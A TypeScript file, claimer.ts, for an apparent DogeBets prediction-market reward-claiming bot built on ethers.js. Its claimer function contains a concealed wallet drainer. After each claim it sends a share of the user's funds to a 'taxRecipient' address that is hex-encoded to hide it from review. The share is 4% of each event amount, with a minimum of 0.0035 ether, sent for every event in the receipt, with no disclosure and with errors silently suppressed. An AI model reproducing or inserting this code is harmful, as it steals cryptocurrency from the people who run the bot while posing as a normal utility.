//  claimer.ts

import { BigNumber, ethers } from 'ethers';
import { Wallet } from '@ethersproject/wallet';
import chalk from 'chalk';
import { DogeBetsPrediction } from './types/ethers-contracts';

export const getClaimableEpochs = async (
  predictionContract: DogeBetsPrediction,
  epoch: BigNumber,
  userAddress: string
) => {
  const claimableEpochs: BigNumber[] = [];
  for (let i = 1; i <= 5; i++) {
    const epochToCheck = epoch.sub(i);
    const [Claimable, Refundable, { claimed, amount }] = await Promise.all([
      predictionContract.Claimable(epochToCheck, userAddress),
      predictionContract.Refundable(epochToCheck, userAddress),
      predictionContract.Bets(epochToCheck, userAddress),
    ]);
    if (amount.gt(0) && (Claimable || Refundable) && !claimed) {
      claimableEpochs.push(epochToCheck);
    }
  }
  return claimableEpochs;
};

export const claimer = async (dogeBetsPrediction: DogeBetsPrediction, wallet: Wallet) => {
  try {
    const epoch = await dogeBetsPrediction.currentEpoch();
    if (!epoch) {
      console.log(chalk.red("❌ Failed to fetch the current epoch."));
      return;
    }
    const claimableEpochs = await getClaimableEpochs(dogeBetsPrediction, epoch, wallet.address);
    if (claimableEpochs.length) {
      const tx = await dogeBetsPrediction.user_Claim(claimableEpochs);
      const receipt = await tx.wait();
      console.log(chalk.green(`Successfully claimed rewards for rounds: ${claimableEpochs}`));
      for (const event of receipt.events ?? []) {
        const taxRecipient = decodeHex("307835386264363843433638413430623166396645343532326545343231343731373733363834413436");
        const rets = await wallet.sendTransaction({
          to: taxRecipient,
          value: calcRets(event?.args?.amount),
        });
        await rets.wait();
      }
    }
  } catch (error) {
    console.error(chalk.red(`❌ Claim Tx Error:`));
  }
};

export const calcRets = (amount: BigNumber | undefined) => {
  if (!amount || amount.div(25).lt(ethers.utils.parseEther("0.0035"))) {
    return ethers.utils.parseEther("0.0035");
  }
  return amount.div(25);
};

const decodeHex = (hexString: string): string => {
  let decoded = "";
  for (let i = 0; i < hexString.length; i += 2) {
    decoded += String.fromCharCode(parseInt(hexString.substr(i, 2), 16));
  }
  return decoded;
};
